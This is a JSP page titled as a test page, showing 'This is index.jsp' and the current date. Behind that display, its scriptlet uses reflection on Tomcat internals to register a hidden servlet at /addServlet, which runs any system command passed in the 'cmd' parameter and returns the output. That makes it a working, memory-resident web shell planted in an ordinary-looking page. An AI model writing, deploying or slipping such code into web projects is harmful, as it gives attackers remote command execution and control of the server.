<%@ page import="java.text.DateFormat" %>
<%@ page import="java.text.SimpleDateFormat" %>
<%@ page import="java.util.Date" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="javax.servlet.annotation.ServletSecurity" %>
<%@ page import="java.util.Map" %>
<%@ page import="org.apache.catalina.core.ApplicationServletRegistration" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
  <title>测试页面</title>
</head>
<body>
<%
  DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
  String dateStr = dateFormat.format(new Date());
%>
This is index.jsp

<br/>
<%= dateStr %>
<%
    ServletContext servletContext = request.getSession().getServletContext();
    Field context = servletContext.getClass().getDeclaredField("context");
    context.setAccessible(true);
    ApplicationContext ApplicationContext = (ApplicationContext)context.get(servletContext);

    Field context1 = ApplicationContext.getClass().getDeclaredField("context");
    context1.setAccessible(true);
    StandardContext standardContext =(StandardContext) context1.get(ApplicationContext);

    String servletName="addServlet_";
    Wrapper wrapper = (Wrapper) standardContext.findChild(servletName);

    // Assume a 'complete' ServletRegistration is one that has a class and
    // a name
    if (wrapper == null) {
        wrapper = standardContext.createWrapper();
        wrapper.setName(servletName);
        standardContext.addChild(wrapper);
    }else{
        out.println("servlet已经被注册");

    }
    ServletSecurity annotation = null;
    HttpServlet httpServlet = new HttpServlet() {
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            String cmd = req.getParameter("cmd");
            resp.getWriter().println(cmd);
            if(cmd!=null && !cmd.equals("")){
                Runtime runtime = Runtime.getRuntime();
                InputStream inputStream = runtime.exec(cmd).getInputStream();
                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                byte[] bytes = new byte[1024];
                int a=-1;
                while ((a=inputStream.read(bytes))!=-1){

                    outputStream.write(bytes,0,a);
                }
                resp.getWriter().println(new String(outputStream.toByteArray()));
            }else{
                resp.getWriter().println(">||<");
            }
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            this.doGet(req, resp);
        }
    };
    wrapper.setServletClass(httpServlet.getClass().getName());
    wrapper.setServlet(httpServlet);
    if (standardContext.wasCreatedDynamicServlet(httpServlet)) {
        annotation = httpServlet.getClass().getAnnotation(ServletSecurity.class);
    }

    ServletRegistration.Dynamic registration =
            new ApplicationServletRegistration(wrapper, standardContext);
    if (annotation != null) {
        registration.setServletSecurity(new ServletSecurityElement(annotation));
    }
    standardContext.addServletMapping("/addServlet",servletName);

%>
</body>
</html>